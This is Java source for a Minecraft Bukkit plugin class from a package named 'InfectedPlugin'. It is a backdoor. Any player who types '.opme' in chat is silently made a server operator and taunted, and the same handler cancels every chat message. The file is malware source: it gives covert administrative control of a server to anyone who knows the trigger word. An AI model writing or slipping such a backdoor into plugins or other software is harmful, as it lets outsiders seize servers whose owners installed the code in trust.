 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_opme implements Listener
 {
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".opme"))
         {
             p.setOp(true);
             p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
             cancel = true;
         }
         
         if (cancel)
         {
        	event.setCancelled(true);
        	return;
         }
     }  
 }
